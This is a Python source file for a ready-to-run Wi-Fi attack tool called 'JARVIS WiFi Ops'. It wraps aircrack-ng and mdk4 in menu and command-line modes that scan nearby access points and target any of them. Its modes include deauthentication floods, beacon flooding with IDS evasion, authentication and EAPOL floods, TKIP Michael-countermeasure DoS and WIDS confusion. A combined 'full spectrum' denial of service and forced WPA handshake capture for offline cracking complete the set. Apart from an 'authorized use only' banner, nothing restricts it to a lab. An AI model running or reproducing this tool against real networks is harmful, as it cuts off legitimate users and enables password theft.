#!/usr/bin/env python3
"""
JARVIS WiFi Ops — Advanced 802.11 Test Platform
═══════════════════════════════════════════════════════════════════════
Authorized use only. Test lab environments with explicit permission.
Operator: RedParadox / JARVIS
═══════════════════════════════════════════════════════════════════════
"""

import os
import sys
import time
import signal
import subprocess
import threading
import argparse
import json
import csv
import re
from datetime import datetime
from pathlib import Path

# ── Require root ──────────────────────────────────────────────────────────────
if os.geteuid() != 0:
    print("\033[91m[!] JARVIS WiFi Ops requires root. Run: sudo python3 jarvis-wifi-ops.py\033[0m")
    sys.exit(1)

# ── Terminal colors ───────────────────────────────────────────────────────────
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
B  = "\033[94m"   # blue
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # white
DIM = "\033[2m"
BOLD = "\033[1m"
RST = "\033[0m"

# ── Global state ──────────────────────────────────────────────────────────────
active_procs: list[subprocess.Popen] = []
monitor_iface: str = ""
original_iface: str = ""
log_path = Path("/home/core/phantom-wifi/ops.log")
log_path.parent.mkdir(parents=True, exist_ok=True)

def log(msg: str, level: str = "INFO"):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] [{level}] {msg}"
    with open(log_path, "a") as f:
        f.write(line + "\n")

def banner():
    print(f"""
{R}╔══════════════════════════════════════════════════════════════╗
║  {W}{BOLD}JARVIS WiFi Ops  ·  802.11 Test Platform{RST}{R}                     ║
║  {DIM}Authorized use only — test lab environments{RST}{R}                ║
╚══════════════════════════════════════════════════════════════╝{RST}
""")

# ── Cleanup on exit ───────────────────────────────────────────────────────────
def cleanup(signum=None, frame=None):
    print(f"\n{Y}[*] Cleaning up — stopping all processes and restoring interface...{RST}")
    for proc in active_procs:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
    active_procs.clear()

    if monitor_iface:
        print(f"{DIM}[*] Stopping monitor mode on {monitor_iface}...{RST}")
        subprocess.run(["airmon-ng", "stop", monitor_iface],
                       capture_output=True)
        subprocess.run(["systemctl", "start", "wpa_supplicant"],
                       capture_output=True)
        print(f"{G}[+] Interface restored to managed mode.{RST}")

    print(f"{G}[+] JARVIS WiFi Ops — session ended.{RST}\n")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ── Interface management ──────────────────────────────────────────────────────
def list_wireless_interfaces() -> list[str]:
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    ifaces = re.findall(r"^(\w+)\s+IEEE", result.stdout, re.MULTILINE)
    return ifaces

def enable_monitor(iface: str) -> str:
    global monitor_iface, original_iface
    original_iface = iface

    print(f"{Y}[*] Killing conflicting processes...{RST}")
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)

    print(f"{Y}[*] Enabling monitor mode on {iface}...{RST}")
    result = subprocess.run(["airmon-ng", "start", iface],
                             capture_output=True, text=True)

    # Determine monitor interface name
    mon = iface + "mon"
    check = subprocess.run(["iwconfig"], capture_output=True, text=True)
    if mon not in check.stdout:
        # Some drivers keep same name
        mon = iface
        subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
        subprocess.run(["iw", iface, "set", "monitor", "none"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)

    monitor_iface = mon
    print(f"{G}[+] Monitor interface: {BOLD}{mon}{RST}")
    log(f"Monitor mode enabled: {mon}")
    return mon

def set_channel(iface: str, channel: int):
    subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                   capture_output=True)

# ── Scan APs ──────────────────────────────────────────────────────────────────
def scan_aps(mon_iface: str, duration: int = 20) -> list[dict]:
    """Run airodump-ng and parse CSV output."""
    scan_prefix = "/tmp/jarvis_wifiops_scan"
    # Clean up old files
    for f in Path("/tmp").glob("jarvis_wifiops_scan*"):
        f.unlink(missing_ok=True)

    print(f"{Y}[*] Scanning for {duration}s...{RST}")
    proc = subprocess.Popen(
        ["airodump-ng", mon_iface,
         "--output-format", "csv",
         "-w", scan_prefix,
         "--write-interval", "5"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(duration)
    proc.terminate()
    proc.wait()

    csv_file = Path(f"{scan_prefix}-01.csv")
    if not csv_file.exists():
        return []

    aps = []
    with open(csv_file, "r", errors="ignore") as f:
        reader = csv.reader(f)
        in_aps = True
        for row in reader:
            if not row:
                in_aps = False
                continue
            if "BSSID" in str(row[0]):
                continue
            if in_aps and len(row) >= 14:
                bssid  = row[0].strip()
                pwr    = row[8].strip()
                ch     = row[3].strip()
                enc    = row[5].strip()
                ssid   = row[13].strip() if len(row) > 13 else ""
                if re.match(r"^[0-9A-Fa-f:]{17}$", bssid):
                    aps.append({
                        "bssid": bssid,
                        "ssid":  ssid or "<hidden>",
                        "ch":    ch,
                        "pwr":   pwr,
                        "enc":   enc,
                    })

    # Sort by signal strength
    def pwr_sort(ap):
        try:
            return int(ap["pwr"])
        except ValueError:
            return -999
    aps.sort(key=pwr_sort, reverse=True)
    return aps

def display_aps(aps: list[dict]):
    print(f"\n{BOLD}{W}  #   BSSID              CH   PWR    ENC     SSID{RST}")
    print(f"{DIM}  ─── ─────────────────── ──── ────── ─────── ─────────────────────{RST}")
    for i, ap in enumerate(aps):
        pwr_val = int(ap["pwr"]) if ap["pwr"].lstrip("-").isdigit() else -99
        pwr_color = G if pwr_val > -50 else Y if pwr_val > -70 else R
        enc_color = R if ap["enc"] == "OPN" else G
        print(f"  {W}{i+1:<3}{RST} {C}{ap['bssid']}{RST}  "
              f"{Y}{ap['ch']:>4}{RST}  "
              f"{pwr_color}{ap['pwr']:>6}{RST}  "
              f"{enc_color}{ap['enc']:<7}{RST} {W}{ap['ssid']}{RST}")
    print()

# ── Attack modules ────────────────────────────────────────────────────────────

def run_deauth(mon_iface: str, target_bssid: str, target_client: str = "FF:FF:FF:FF:FF:FF",
               count: int = 0, channel: int = None):
    """
    Deauthentication flood — disconnects all clients from target AP.
    count=0 means continuous.
    """
    if channel:
        set_channel(mon_iface, channel)

    cmd_mdk4 = [
        "mdk4", mon_iface, "d",
        "-B", target_bssid,
        "-c", str(channel) if channel else "0",
    ]
    cmd_aireplay = [
        "aireplay-ng",
        "--deauth", str(count) if count else "0",
        "-a", target_bssid,
        "-c", target_client,
        mon_iface,
    ]

    print(f"{R}[!] DEAUTH FLOOD → {target_bssid} (client: {target_client}){RST}")
    print(f"{DIM}    mdk4 + aireplay-ng dual-stream{RST}")
    log(f"DEAUTH started: bssid={target_bssid} client={target_client}")

    p1 = subprocess.Popen(cmd_mdk4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    p2 = subprocess.Popen(cmd_aireplay, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.extend([p1, p2])

    print(f"{G}[+] Running. Press Ctrl+C to stop.{RST}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def run_beacon_flood(mon_iface: str, ssid_list: list[str] = None, count: int = 200,
                     encrypt: bool = False, channel: int = None):
    """
    Beacon flood — floods airspace with fake AP beacons.
    Crashes many Wi-Fi scanners and IDS systems.
    """
    ssid_file = "/tmp/jarvis_beacons.txt"
    if ssid_list:
        with open(ssid_file, "w") as f:
            for s in ssid_list:
                f.write(s + "\n")

    cmd = ["mdk4", mon_iface, "b"]
    if ssid_list:
        cmd += ["-f", ssid_file]
    if encrypt:
        cmd += ["-w", "WPA2"]
    if channel:
        cmd += ["-c", str(channel)]

    # Ghost mode — IDS evasion
    cmd += ["--ghost", "100,54,10"]

    print(f"{M}[!] BEACON FLOOD — broadcasting {count if ssid_list else 'random'} fake APs{RST}")
    print(f"{DIM}    IDS ghost mode active — rate/power randomization enabled{RST}")
    log(f"BEACON FLOOD started: channel={channel}")

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)

    print(f"{G}[+] Running. Press Ctrl+C to stop.{RST}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def run_auth_dos(mon_iface: str, target_bssid: str, channel: int = None):
    """
    Authentication DoS — floods AP with fake auth requests.
    Crashes or freezes many APs.
    """
    if channel:
        set_channel(mon_iface, channel)

    cmd = ["mdk4", mon_iface, "a",
           "-a", target_bssid,
           "-m",  # use valid client MAC from captured traffic
           ]

    print(f"{Y}[!] AUTH DoS → {target_bssid}{RST}")
    print(f"{DIM}    Flooding AP with authentication requests{RST}")
    log(f"AUTH DoS started: bssid={target_bssid}")

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)

    print(f"{G}[+] Running. Press Ctrl+C to stop.{RST}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def run_eapol_flood(mon_iface: str, target_bssid: str, channel: int = None):
    """
    EAPOL Start flood — keeps AP busy with fake 802.1X sessions.
    Prevents legitimate clients from connecting.
    """
    if channel:
        set_channel(mon_iface, channel)

    cmd = ["mdk4", mon_iface, "e",
           "-t", target_bssid,
           ]

    print(f"{B}[!] EAPOL FLOOD → {target_bssid}{RST}")
    print(f"{DIM}    Filling AP EAPOL session table — blocks all new connections{RST}")
    log(f"EAPOL FLOOD started: bssid={target_bssid}")

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)

    print(f"{G}[+] Running. Press Ctrl+C to stop.{RST}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def run_michael_dos(mon_iface: str, target_bssid: str, channel: int = None):
    """
    Michael Countermeasures exploit — targets WPA/TKIP APs.
    Forces a 60-second lockout on the AP.
    """
    if channel:
        set_channel(mon_iface, channel)

    cmd = ["mdk4", mon_iface, "m",
           "-t", target_bssid,
           ]

    print(f"{R}[!] MICHAEL DoS → {target_bssid}{RST}")
    print(f"{DIM}    Exploiting TKIP Michael Countermeasures — 60s AP shutdown cycles{RST}")
    log(f"MICHAEL DoS started: bssid={target_bssid}")

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)

    print(f"{G}[+] Running. Press Ctrl+C to stop.{RST}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def run_wids_confusion(mon_iface: str, target_bssid: str):
    """
    WIDS Confusion — confuses Wireless IDS/IPS by cross-connecting
    clients to multiple fake WDS nodes.
    """
    cmd = ["mdk4", mon_iface, "w",
           "-e", target_bssid,
           ]

    print(f"{C}[!] WIDS CONFUSION → {target_bssid}{RST}")
    print(f"{DIM}    Spoofing rogue APs and WDS connections to overwhelm IDS{RST}")
    log(f"WIDS CONFUSION started: bssid={target_bssid}")

    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)

    print(f"{G}[+] Running. Press Ctrl+C to stop.{RST}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def run_full_spectrum(mon_iface: str, target_bssid: str, channel: int = None):
    """
    FULL SPECTRUM — simultaneous deauth + auth DoS + EAPOL flood.
    Maximum saturation of target AP.
    """
    if channel:
        set_channel(mon_iface, channel)

    print(f"{R}{BOLD}[!] FULL SPECTRUM ATTACK → {target_bssid}{RST}")
    print(f"{DIM}    Deauth + Auth DoS + EAPOL flood — triple-stream saturation{RST}")
    print(f"{Y}    WARNING: This will completely deny service to the target AP.{RST}\n")
    log(f"FULL SPECTRUM started: bssid={target_bssid} channel={channel}")

    # Stream 1: mdk4 deauth
    p1 = subprocess.Popen(
        ["mdk4", mon_iface, "d", "-B", target_bssid],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    # Stream 2: aireplay-ng deauth broadcast
    p2 = subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", target_bssid, mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    # Stream 3: auth DoS
    p3 = subprocess.Popen(
        ["mdk4", mon_iface, "a", "-a", target_bssid],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    # Stream 4: EAPOL flood
    p4 = subprocess.Popen(
        ["mdk4", mon_iface, "e", "-t", target_bssid],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    active_procs.extend([p1, p2, p3, p4])

    # Live status ticker
    start = time.time()
    print(f"{G}[+] 4 attack streams running:{RST}")
    print(f"    {R}[1]{RST} mdk4 deauth flood")
    print(f"    {R}[2]{RST} aireplay-ng broadcast deauth")
    print(f"    {R}[3]{RST} mdk4 auth DoS")
    print(f"    {R}[4]{RST} mdk4 EAPOL flood")
    print(f"\n{DIM}Press Ctrl+C to stop all streams.{RST}\n")

    try:
        while True:
            elapsed = int(time.time() - start)
            alive = sum(1 for p in [p1,p2,p3,p4] if p.poll() is None)
            print(f"\r{Y}[{elapsed:>4}s]{RST} Streams active: {G}{alive}/4{RST}    ", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass


def run_handshake_capture(mon_iface: str, target_bssid: str, target_ssid: str,
                           channel: int, output_dir: str = "/home/core/phantom-wifi/captures"):
    """
    Handshake capture — deauths clients to force WPA handshake, captures it.
    Output: .cap file ready for hashcat/aircrack-ng.
    """
    Path(output_dir).mkdir(parents=True, exist_ok=True)
    cap_prefix = f"{output_dir}/{target_ssid.replace(' ','_')}_{datetime.now().strftime('%H%M%S')}"

    set_channel(mon_iface, channel)

    print(f"{C}[*] HANDSHAKE CAPTURE → {target_ssid} ({target_bssid}){RST}")
    print(f"{DIM}    Channel {channel} | Output: {cap_prefix}-01.cap{RST}")
    log(f"HANDSHAKE CAPTURE: ssid={target_ssid} bssid={target_bssid} ch={channel}")

    # Start airodump on target channel
    capture_proc = subprocess.Popen(
        ["airodump-ng",
         "-c", str(channel),
         "--bssid", target_bssid,
         "-w", cap_prefix,
         "--output-format", "cap",
         mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_procs.append(capture_proc)

    # Wait for traffic to appear then deauth
    print(f"{Y}[*] Monitoring for clients... deauth burst in 5s{RST}")
    time.sleep(5)

    # Deauth burst to force handshake
    for burst in range(5):
        print(f"\r{R}[!] Deauth burst {burst+1}/5...{RST}   ", end="", flush=True)
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", target_bssid, mon_iface],
            capture_output=True
        )
        time.sleep(3)

    print(f"\n{Y}[*] Monitoring for handshake (60s)...{RST}")
    print(f"{DIM}    Use aircrack-ng or hashcat on {cap_prefix}-01.cap when complete.{RST}")

    try:
        time.sleep(60)
    except KeyboardInterrupt:
        pass

    capture_proc.terminate()
    print(f"\n{G}[+] Capture saved: {cap_prefix}-01.cap{RST}")
    log(f"HANDSHAKE CAPTURE saved: {cap_prefix}-01.cap")


# ── Interactive menu ──────────────────────────────────────────────────────────

def select_interface() -> str:
    ifaces = list_wireless_interfaces()
    print(f"{W}Available wireless interfaces:{RST}")
    for i, iface in enumerate(ifaces):
        print(f"  {C}{i+1}{RST}. {W}{iface}{RST}")
    while True:
        choice = input(f"\n{Y}Select interface [{'/'.join(str(i+1) for i in range(len(ifaces)))}]: {RST}").strip()
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(ifaces):
                return ifaces[idx]
        except ValueError:
            pass
        print(f"{R}Invalid selection.{RST}")

def select_target(aps: list[dict]) -> dict:
    while True:
        choice = input(f"{Y}Select target [1-{len(aps)}] or BSSID: {RST}").strip()
        if re.match(r"^[0-9A-Fa-f:]{17}$", choice):
            return {"bssid": choice.upper(), "ssid": "manual", "ch": "1"}
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(aps):
                return aps[idx]
        except ValueError:
            pass
        print(f"{R}Invalid.{RST}")

def interactive_menu():
    banner()

    # Interface selection
    iface = select_interface()
    mon = enable_monitor(iface)
    print()

    while True:
        # Scan
        aps = scan_aps(mon, duration=20)
        if not aps:
            print(f"{R}[!] No APs found. Check monitor mode.{RST}")
            continue

        display_aps(aps)

        print(f"{BOLD}{W}Attack Modes:{RST}")
        print(f"  {R}1{RST}. Deauth Flood           — kicks all clients off target AP")
        print(f"  {M}2{RST}. Beacon Flood            — floods airspace with fake APs")
        print(f"  {Y}3{RST}. Auth DoS                — freezes AP with fake auth requests")
        print(f"  {B}4{RST}. EAPOL Flood             — blocks all new connections to AP")
        print(f"  {R}5{RST}. Michael DoS (TKIP only) — forces 60s AP shutdown cycles")
        print(f"  {C}6{RST}. WIDS Confusion          — overwhelms intrusion detection")
        print(f"  {R}{BOLD}7{RST}. FULL SPECTRUM          — deauth+auth+EAPOL simultaneous")
        print(f"  {G}8{RST}. Handshake Capture       — capture WPA handshake for cracking")
        print(f"  {Y}9{RST}. Re-scan APs")
        print(f"  {DIM}0{RST}. Exit\n")

        mode = input(f"{Y}Select mode [0-9]: {RST}").strip()

        if mode == "0":
            cleanup()
        elif mode == "9":
            continue
        elif mode == "2":
            # Beacon flood doesn't require a specific target
            custom = input(f"{Y}Custom SSID list? (leave blank for random): {RST}").strip()
            ssid_list = [s.strip() for s in custom.split(",")] if custom else None
            ch_in = input(f"{Y}Channel (blank=hop all): {RST}").strip()
            ch = int(ch_in) if ch_in.isdigit() else None
            run_beacon_flood(mon, ssid_list, channel=ch)
        else:
            target = select_target(aps)
            ch = int(target["ch"]) if target["ch"].isdigit() else None
            bssid = target["bssid"]
            ssid  = target["ssid"]

            print(f"\n{W}Target: {G}{ssid}{RST} {DIM}({bssid} CH{ch}){RST}\n")

            if mode == "1":
                client = input(f"{Y}Target client MAC (blank=broadcast all): {RST}").strip()
                client = client if re.match(r"^[0-9A-Fa-f:]{17}$", client) else "FF:FF:FF:FF:FF:FF"
                run_deauth(mon, bssid, client, channel=ch)
            elif mode == "3":
                run_auth_dos(mon, bssid, channel=ch)
            elif mode == "4":
                run_eapol_flood(mon, bssid, channel=ch)
            elif mode == "5":
                run_michael_dos(mon, bssid, channel=ch)
            elif mode == "6":
                run_wids_confusion(mon, bssid)
            elif mode == "7":
                confirm = input(f"{R}FULL SPECTRUM on {ssid} — confirm [yes]: {RST}").strip()
                if confirm.lower() == "yes":
                    run_full_spectrum(mon, bssid, channel=ch)
            elif mode == "8":
                run_handshake_capture(mon, bssid, ssid, ch or 1)

        print(f"\n{DIM}--- Attack stopped ---{RST}\n")
        # Stop lingering procs between attacks
        for p in active_procs[:]:
            try:
                p.terminate()
            except Exception:
                pass
        active_procs.clear()


# ── CLI mode ──────────────────────────────────────────────────────────────────

def cli_mode(args):
    banner()
    iface = args.interface
    mon = enable_monitor(iface)

    if args.scan:
        aps = scan_aps(mon, duration=args.scan_time)
        display_aps(aps)
        if args.output:
            with open(args.output, "w") as f:
                json.dump(aps, f, indent=2)
            print(f"{G}[+] Scan saved to {args.output}{RST}")
        cleanup()

    elif args.mode == "deauth":
        run_deauth(mon, args.bssid, args.client or "FF:FF:FF:FF:FF:FF", channel=args.channel)
    elif args.mode == "beacon":
        ssid_list = args.ssids.split(",") if args.ssids else None
        run_beacon_flood(mon, ssid_list, channel=args.channel)
    elif args.mode == "auth":
        run_auth_dos(mon, args.bssid, channel=args.channel)
    elif args.mode == "eapol":
        run_eapol_flood(mon, args.bssid, channel=args.channel)
    elif args.mode == "michael":
        run_michael_dos(mon, args.bssid, channel=args.channel)
    elif args.mode == "wids":
        run_wids_confusion(mon, args.bssid)
    elif args.mode == "full":
        run_full_spectrum(mon, args.bssid, channel=args.channel)
    elif args.mode == "capture":
        run_handshake_capture(mon, args.bssid, args.ssid or "target", args.channel or 6)
    else:
        print(f"{R}[!] No mode specified. Use --help or run without arguments for interactive mode.{RST}")


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) == 1:
        interactive_menu()
    else:
        parser = argparse.ArgumentParser(
            description="JARVIS WiFi Ops — Advanced 802.11 Test Platform",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  sudo python3 jarvis-wifi-ops.py                              # interactive menu
  sudo python3 jarvis-wifi-ops.py -i wlan1 --scan              # scan APs
  sudo python3 jarvis-wifi-ops.py -i wlan1 -m deauth -b AA:BB:CC:DD:EE:FF -c 6
  sudo python3 jarvis-wifi-ops.py -i wlan1 -m full   -b AA:BB:CC:DD:EE:FF -c 1
  sudo python3 jarvis-wifi-ops.py -i wlan1 -m beacon --ssids "FakeAP1,FakeAP2"
  sudo python3 jarvis-wifi-ops.py -i wlan1 -m capture -b AA:BB:CC:DD:EE:FF -c 11

AUTHORIZED USE ONLY — test lab environments with explicit permission.
            """
        )
        parser.add_argument("-i", "--interface", default="wlan1",
                            help="Wireless interface to use (default: wlan1)")
        parser.add_argument("-m", "--mode",
                            choices=["deauth","beacon","auth","eapol","michael","wids","full","capture"],
                            help="Attack mode")
        parser.add_argument("-b", "--bssid", help="Target AP BSSID (AA:BB:CC:DD:EE:FF)")
        parser.add_argument("--ssid", help="Target AP SSID (for capture mode)")
        parser.add_argument("--client", help="Target client MAC (deauth mode, default=broadcast)")
        parser.add_argument("--ssids", help="Comma-separated SSIDs for beacon flood")
        parser.add_argument("-c", "--channel", type=int, help="Target channel")
        parser.add_argument("--scan", action="store_true", help="Scan mode — list APs and exit")
        parser.add_argument("--scan-time", type=int, default=20, help="Scan duration in seconds")
        parser.add_argument("-o", "--output", help="Save scan results to JSON file")
        args = parser.parse_args()
        cli_mode(args)
